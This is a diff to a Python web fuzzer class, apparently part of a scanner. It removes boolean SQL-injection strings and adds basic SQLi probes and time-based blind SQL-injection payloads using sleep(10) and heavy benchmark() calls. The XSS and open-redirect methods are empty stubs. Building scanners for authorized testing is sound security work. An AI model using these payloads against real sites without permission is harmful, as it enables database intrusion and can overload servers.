@@ -1,6 +1,5 @@
 from urllib.parse import parse_qs, unquote, urlparse, urljoin, urlencode
-from Crawler import Crawler, DATABASE, sessions
-from . import __globals__ as var
+from .Crawler import Crawler, DATABASE, sessions, var
 from bs4 import BeautifulSoup
 from threading import Thread
 from base64 import b64decode
@@ -33,16 +32,46 @@ class Fuzzing:
             self.REQUESTS = sessions(URL, **REQUEST_INFO)
             self.TMP_REQUEST = self.REQUESTS.sess_get()
 
+    def URL(self):
+        self.conn.URL_SELECT(TABLE_NAME=self.table)
+
     def xss():
-        pass
+        payloads = []
+        
+        return payloads
+
     def opredirect():
-        pass
-    def sqli():
         payloads = [
-            '\' or 1=1 -- \'',
-            '\'/**/or/**/1=1/**/--/**/\'',
-            '\' or 1 -- \'',
-            '\' or 1 -- \'',
-            '\'||1 -- \'',
-            '\'||1/**/--/**/\''
+            ''
         ]
+
+        return payloads
+
+    def simple_sqli():
+        payloads = [
+            '\'',
+            '"',
+            '0',
+            '0\'',
+            '0"',
+        ]
+
+        return payloads
+
+    def sleep_sqli():
+        payloads = [
+            '\' or sleep(10) -- \'',
+            '" or sleep(10) -- "',
+            '0 or sleep(10) -- ',
+            '\' or sleep(10) #\'',
+            '" or sleep(10) #"',
+            '0 or sleep(10) #',
+            '\' or benchmark(7380000000*10,md5(1)) -- \'',
+            '" or benchmark(7380000000*10,md5(1)) -- "',
+            '0 or benchmark(7380000000*10,md5(1)) -- ',
+            '\' or benchmark(7380000000*10,md5(1)) #\'',
+            '" or benchmark(7380000000*10,md5(1)) #"',
+            '0 or benchmark(7380000000*10,md5(1)) #',
+        ]
+
+        return payloads
